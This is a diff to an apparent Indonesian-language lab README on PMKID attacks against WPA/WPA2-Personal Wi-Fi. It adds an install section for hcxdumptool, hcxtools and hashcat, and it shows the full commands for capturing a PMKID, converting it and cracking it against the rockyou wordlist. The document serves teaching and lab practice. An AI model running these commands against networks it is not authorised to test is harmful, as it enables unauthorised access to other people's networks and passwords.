@@ -4,6 +4,7 @@
 - [Apa itu PMKID Attack?](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#apa-itu-pmkid-attack)
 - [Cara Kerja](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#cara-kerja)
 - [Persyaratan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#persyaratan)
+- [Instalasi](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/pmkid%20attack#instalasi)
 - [Langkah-Langkah](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#langkah-langkah)
   
 ## Apa itu PMKID Attack?
@@ -12,13 +13,13 @@ PMKID Attack adalah teknik serangan pada jaringan Wi-Fi WPA/WPA2-Personal untuk 
 ## Cara Kerja
 PMKID (Pairwise Master Key Identifier) adalah nilai identifikasi yang digunakan oleh AP dalam proses autentikasi WPA/WPA2. Nilai ini dihitung menggunakan rumus berikut:
 
-```
+```bash
 PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
 ```
 
 PMK (Pairwise Master Key) diturunkan langsung dari password jaringan (PSK) dan SSID menggunakan fungsi PBKDF2-SHA1 dengan rumus berikut:
 
-```
+```bash
 PMK = PBKDF2(HMAC-SHA1, PSK, SSID, 4096, 256)
 ```
 
@@ -39,11 +40,35 @@ Serangan ini bekerja pada RSN IE (Robust Security Network Information Element) y
 - Hashcat
 - Wordlist (`rockyou.txt`)
 
+## Instalasi
+
+```bash
+sudo apt-get update
+sudo apt-get install build-essential pkg-config libssl-dev libcurl4-openssl-dev zlib1g-dev libpcap-dev wget hashcat hashcat-data wordlists
+
+# instal hcxdumptool
+wget https://github.com/ZerBea/hcxdumptool/releases/download/6.2.8/hcxdumptool-6.2.8.tar.gz
+tar -zxvf hcxdumptool-6.2.8.tar.gz
+cd hcxdumptool-6.2.8
+make
+sudo make install
+
+# instal hcxtools
+wget https://github.com/ZerBea/hcxtools/releases/download/6.2.8/hcxtools-6.2.8.tar.gz
+tar -zxvf hcxtools-6.2.8.tar.gz
+cd hcxtools-6.2.8
+make
+sudo make install
+
+# ekstrak wordlist rockyou.txt.gz
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+```
+
 ## Langkah-Langkah
 
 #### 1. Lihat semua interface wireless yang aktif:
 
-```
+```bash
 hcxdumptool -I
 ```
 
@@ -51,7 +76,7 @@ hcxdumptool -I
 
 #### 2. Aktifkan mode monitor:
 
-```
+```bash
 sudo hcxdumptool -m wlan1
 ```
 
@@ -59,7 +84,7 @@ sudo hcxdumptool -m wlan1
 
 #### 3. Capture PMKID menggunakan hcxdumptool:
 
-```
+```bash
 sudo hcxdumptool -i wlan1 -o capture.pcap -s 2 --disable_client_attacks --disable_deauthentication --tot=5 --enable_status=1
 ```
 
@@ -67,7 +92,7 @@ sudo hcxdumptool -i wlan1 -o capture.pcap -s 2 --disable_client_attacks --disabl
 
 #### 4. Konversi hasil capture ke format Hashcat:
 
-```
+```bash
 hcxpcapngtool -o hash.txt capture.pcap
 ```
 
@@ -76,7 +101,7 @@ hcxpcapngtool -o hash.txt capture.pcap
 
 #### 5. Lihat hasil konversi hash:
 
-```
+```bash
 cat hash.txt
 ```
 
@@ -84,7 +109,7 @@ cat hash.txt
 
 #### 6. Crack hash menggunakan Hashcat:
 
-```
+```bash
 hashcat -a 0 -m 22000 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -92,7 +117,7 @@ hashcat -a 0 -m 22000 hash.txt /usr/share/wordlists/rockyou.txt
 
 #### 7. Lihat hasil cracking:
 
-```
+```bash
 hashcat -m 22000 --show hash.txt
 ```
 
